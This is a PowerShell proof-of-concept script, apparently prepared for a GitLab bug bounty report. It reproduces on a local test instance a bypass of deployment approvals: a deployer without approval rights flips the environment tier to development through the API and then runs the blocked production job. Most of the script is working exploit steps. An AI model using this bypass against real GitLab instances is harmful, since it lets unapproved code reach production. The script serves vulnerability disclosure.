# ============================================================
#  verify-all.ps1  -  ONE-CLICK VERIFICATION
#  Proves: deployer without approval rights can bypass
#  deployment approvals by changing the environment tier.
#
#  HOW TO RUN:
#    1. Start screen recording (Win+G)
#    2. In PowerShell, paste:
#       powershell -ExecutionPolicy Bypass -File "C:\Users\aidan\Desktop\Gitlab bug bounty\verify-all.ps1"
#    3. Press Enter when the script asks you to - narrate what you see
#    4. Transcript saved to evidence\verify-run.txt
# ============================================================

$ErrorActionPreference = "Continue"
$B     = "http://localhost:8081/api/v4"
$PROJ  = "acme%2Fapp"
$ROOT  = "f90f8b39b1a710346c1d30a7f4fb68dd426c2e81"
$ATK   = "3fc88868c629ab91e6b15c9b58be4e56e398a290"
$EVID  = "C:\Users\aidan\Desktop\Gitlab bug bounty\evidence"
$SUF   = Get-Random -Minimum 1000 -Maximum 9999
$ENVNAME = "payments-$SUF"
$BRANCH  = "workloads/verify-$SUF"
$BRANCHQ = [uri]::EscapeDataString($BRANCH)

Start-Transcript -Path "$EVID\verify-run.txt" -Force | Out-Null

$results = @()
function Record($step, $desc, $pass, $detail) {
    $script:results += [pscustomobject]@{Step=$step; Check=$desc; Result=$pass; Detail=$detail}
    if ($pass) { Write-Host "  [PASS] $step - $desc  ($detail)" -ForegroundColor Green }
    else       { Write-Host "  [FAIL] $step - $desc  ($detail)" -ForegroundColor Red }
}
function Invoke-Api($Method, $Uri, $Body, $Token) {
    try {
        $p = @{ Method=$Method; Uri=$Uri; Headers=@{"PRIVATE-TOKEN"=$Token}; UseBasicParsing=$true }
        if ($Body -and $Body.StartsWith("{")) { $p.Body=$Body; $p.ContentType="application/json" }
        elseif ($Body) { $p.Body=$Body; $p.ContentType="application/x-www-form-urlencoded" }
        $r = Invoke-WebRequest @p
        return @{ Code=[int]$r.StatusCode; Content=$r.Content }
    } catch {
        $code = 0
        if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
        $msg = ""
        if ($_.ErrorDetails -and $_.ErrorDetails.Message) { $msg = $_.ErrorDetails.Message }
        return @{ Code=$code; Content=$msg }
    }
}

Write-Host "============================================================" -ForegroundColor Cyan
Write-Host " GITLAB EE 19.5.1 - TIER-FLIP DEPLOYMENT APPROVAL BYPASS"      -ForegroundColor Cyan
Write-Host " Run: $SUF   Env: $ENVNAME   Branch: $BRANCH"                 -ForegroundColor Cyan
Write-Host " All testing on my own self-managed instance"                -ForegroundColor Cyan
Write-Host "============================================================" -ForegroundColor Cyan

Write-Host "`n[STEP 0] Waiting for GitLab to respond..." -ForegroundColor Yellow
foreach ($i in 1..40) {
    $h = Invoke-Api GET "$B/version" $null $ROOT
    if ($h.Code -eq 200) { Write-Host "  GitLab is up."; break }
    Start-Sleep -Seconds 10
}

# ------------------------------------------------------------
Write-Host "`n[STEP 1] Show protection config (deploy=Developers 30, approval=Maintainers 40 x1)" -ForegroundColor Yellow
$r = Invoke-Api GET "$B/groups/acme/protected_environments" $null $ROOT
Write-Host $r.Content
$ok = ($r.Content -match '"access_level":30' -and $r.Content -match '"required_approvals":1')
Record "1" "Group PE has deploy 30 + approval 40x1" $ok $r.Code
Read-Host  "Press Enter to continue"

# ------------------------------------------------------------
Write-Host "`n[STEP 2] Attacker pushes deploy job for env '$ENVNAME' (tier production)" -ForegroundColor Yellow
Invoke-Api POST "$B/projects/$PROJ/repository/branches?branch=$BRANCHQ&ref=main" $null $ATK | Out-Null
$ciLine = "deploy-${ENVNAME}:" + "`n  stage: deploy" + "`n  script: echo deploying $ENVNAME" + "`n  environment:" + "`n    name: $ENVNAME" + "`n    deployment_tier: production" + "`n  when: manual" + "`n"
$ci = @{
  branch = $BRANCH
  commit_message = "verify run $SUF"
  actions = @(@{ action="update"; file_path=".gitlab-ci.yml"; content=$ciLine })
} | ConvertTo-Json -Depth 5
$r = Invoke-Api POST "$B/projects/$PROJ/repository/commits" $ci $ATK
$ok = ($r.Code -eq 201)
Record "2" "Attacker pushed CI job" $ok $r.Code

# ------------------------------------------------------------
Write-Host "`n[STEP 3] Attacker starts pipeline; waiting for blocked deployment" -ForegroundColor Yellow
$r = Invoke-Api POST "$B/projects/$PROJ/pipeline" "ref=$BRANCHQ" $ATK
$pipe = ($r.Content | ConvertFrom-Json).id
Write-Host "  pipeline id = $pipe"
Start-Sleep -Seconds 15

$job = $null
foreach ($i in 1..6) {
    $jobs = (Invoke-Api GET "$B/projects/$PROJ/pipelines/$pipe/jobs" $null $ATK).Content | ConvertFrom-Json
    $job  = ($jobs | Where-Object { $_.name -like "deploy-$ENVNAME*" }).id
    if ($job) { break }
    Start-Sleep -Seconds 5
}
$envs = (Invoke-Api GET "$B/projects/$PROJ/environments?search=$ENVNAME" $null $ATK).Content | ConvertFrom-Json
$envId = ($envs | Where-Object { $_.name -eq $ENVNAME }).id
Write-Host "  job id = $job    environment id = $envId"

$dep = $null
foreach ($i in 1..6) {
    $deps = (Invoke-Api GET "$B/projects/$PROJ/deployments?environment=$ENVNAME" $null $ATK).Content | ConvertFrom-Json
    if ($deps.Count -gt 0) { $dep = $deps[0]; break }
    Start-Sleep -Seconds 5
}
$ok = ($dep -and $dep.status -eq "blocked")
Record "3" "Deployment created and BLOCKED awaiting approval" $ok $dep.status
Read-Host  "Press Enter to continue (watch: gate is enforcing)"

# ------------------------------------------------------------
Write-Host "`n[STEP 4] CONTROL: attacker tries to play the blocked job" -ForegroundColor Yellow
$r = Invoke-Api POST "$B/projects/$PROJ/jobs/$job/play" $null $ATK
Write-Host "  HTTP $($r.Code)  $($r.Content)"
$ok = ($r.Code -eq 403 -or $r.Code -eq 400)
Record "4" "Play BLOCKED while approval pending (403/400)" $ok $r.Code
Read-Host  "Press Enter to continue (now the attack)"

# ------------------------------------------------------------
Write-Host "`n[STEP 5] ATTACK: attacker (deployer, NOT approver) flips tier to development" -ForegroundColor Yellow
Write-Host "  PUT: $B/projects/$PROJ/environments/${envId}?tier=development"
$r = Invoke-Api PUT "$B/projects/$PROJ/environments/${envId}?tier=development" $null $ATK
Write-Host "  BODY: $($r.Content)"
Write-Host "  HTTP $($r.Code)"
$ok = ($r.Code -eq 200)
Record "5" "Tier changed via plain environment API (200)" $ok $r.Code
Read-Host  "Press Enter to continue (approvals now skipped)"

# ------------------------------------------------------------
Write-Host "`n[STEP 6] Play the same job again - ZERO approvals were ever cast" -ForegroundColor Yellow
$r = Invoke-Api POST "$B/projects/$PROJ/jobs/$job/play" $null $ATK
Write-Host "  HTTP $($r.Code)"
$ok = ($r.Code -eq 200)
Record "6" "Play SUCCEEDS after tier flip (200)" $ok $r.Code

Write-Host "  waiting for the job to finish..."
$jobStatus = "unknown"
foreach ($i in 1..12) {
    Start-Sleep -Seconds 5
    $j = (Invoke-Api GET "$B/projects/$PROJ/jobs/$job" $null $ATK).Content | ConvertFrom-Json
    $jobStatus = $j.status
    if ($jobStatus -in @("success","failed")) { break }
}
$ok = ($jobStatus -eq "success")
Record "6b" "Job executed end-to-end (success)" $ok $jobStatus

# ------------------------------------------------------------
Write-Host "`n[STEP 7] Final state: deployment succeeded, approvals = none" -ForegroundColor Yellow
$deps = (Invoke-Api GET "$B/projects/$PROJ/deployments?environment=$ENVNAME" $null $ATK).Content | ConvertFrom-Json
$deps | ForEach-Object { Write-Host ("  deployment {0}  status={1}  user={2}  job={3}" -f $_.id, $_.status, $_.user.username, $_.deployable.id) }
$runDep = $deps | Where-Object { $_.deployable.id -eq $job } | Select-Object -First 1
$ok = ($runDep -and $runDep.status -eq "success" -and $runDep.user.username -eq "attacker")
if ($runDep) { Record "7" "Deployment SUCCESS with zero approvals" $ok $runDep.status }
else         { Record "7" "Deployment SUCCESS with zero approvals" $false "no deployment for job $job" }

# ------------------------------------------------------------
Write-Host "`n[STEP 8] Instance version (for the report)" -ForegroundColor Yellow
$r = Invoke-Api GET "$B/version" $null $ROOT
Write-Host "  $($r.Content)"
$ok = ($r.Content -match "19\.5\.1")
Record "8" "Version captured 19.5.1-ee" $ok ""

# ------------------------------------------------------------
Write-Host "`n================ RESULTS ================" -ForegroundColor Cyan
$fail = 0
foreach ($x in $results) {
    if ($x.Result) { Write-Host ("  [PASS] {0,-4} {1}" -f $x.Step, $x.Check) -ForegroundColor Green }
    else           { Write-Host ("  [FAIL] {0,-4} {1}" -f $x.Step, $x.Check) -ForegroundColor Red; $fail++ }
}
if ($fail -eq 0) {
    Write-Host "`n  ALL STEPS PASSED - the bypass is reproduced on your machine." -ForegroundColor Green
    Write-Host "  Save your screen recording. You can now submit REPORT-DRAFT.md." -ForegroundColor Green
} else {
    Write-Host "`n  $fail CHECK(S) FAILED - do NOT submit. Paste this output to Claude." -ForegroundColor Red
}
Stop-Transcript | Out-Null
Write-Host "`nTranscript saved to $EVID\verify-run.txt"
Write-Host "(Optional) instance health check for the report:"
Write-Host '  docker exec gitlab gitlab-rake gitlab:check SANITIZE=true'
